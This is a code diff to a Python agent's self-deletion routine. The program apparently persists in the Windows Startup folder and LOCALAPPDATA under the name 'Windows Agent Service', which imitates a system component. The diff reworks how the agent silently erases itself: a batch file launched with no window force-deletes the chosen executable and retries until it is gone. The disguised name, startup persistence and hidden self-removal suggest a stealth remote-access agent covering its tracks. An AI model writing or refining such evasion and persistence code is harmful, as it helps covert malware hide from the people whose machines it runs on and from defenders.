@@ -143,53 +143,50 @@ def self_delete_agent(trigger_id):
         "Programs",
         "Startup",
     )
-    candidates = []
     startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
-    startup_vbs = os.path.join(startup_dir, "Windows Agent Service.vbs")
-    startup_lnk = os.path.join(startup_dir, "Windows Agent Service.lnk")
-    if startup_exe:
-        candidates.append(startup_exe)
-    if startup_vbs:
-        candidates.append(startup_vbs)
-    if startup_lnk:
-        candidates.append(startup_lnk)
-
-    if getattr(sys, "frozen", False):
-        candidates.append(os.path.abspath(sys.executable))
-    else:
-        candidates.append(os.path.abspath(__file__))
-
+    current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
     local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
     local_exe = os.path.join(local_dir, "Windows Agent Service.exe")
-    if local_exe:
-        candidates.append(local_exe)
 
-    seen = set()
-    unique_paths = []
-    for path in candidates:
-        if not path:
-            continue
-        normalized = os.path.normcase(os.path.abspath(path))
-        if normalized in seen:
-            continue
-        seen.add(normalized)
-        unique_paths.append(normalized)
+    target_path = None
+    if startup_exe and os.path.exists(startup_exe):
+        target_path = startup_exe
+    elif current_exe and os.path.exists(current_exe):
+        target_path = current_exe
+    elif local_exe and os.path.exists(local_exe):
+        target_path = local_exe
+
+    if target_path is None:
+        try:
+            os._exit(0)
+        except Exception:
+            raise SystemExit(0)
 
     batch_lines = [
         "@echo off",
         "setlocal",
+        "set \"target=%~1\"",
         "timeout /t 2 /nobreak >nul",
+        ":retry",
+        "if exist \"%target%\" del /f /q \"%target%\" 2>nul",
+        "if exist \"%target%\" (",
+        "  timeout /t 1 /nobreak >nul",
+        "  goto :retry",
+        ")",
+        "exit /b 0",
     ]
-    for path in unique_paths:
-        batch_lines.append(f'del /f /q "{path}" 2>nul')
-    batch_lines.append("exit /b 0")
 
     tmp_dir = tempfile.gettempdir()
     batch_path = os.path.join(tmp_dir, f"telelluc_self_delete_{int(time.time())}.bat")
     try:
         with open(batch_path, "w", encoding="utf-8") as fh:
             fh.write("\n".join(batch_lines) + "\n")
-        subprocess.Popen(["cmd", "/c", batch_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+        subprocess.Popen(
+            ["cmd", "/c", batch_path, target_path],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+        )
     except Exception:
         pass
 
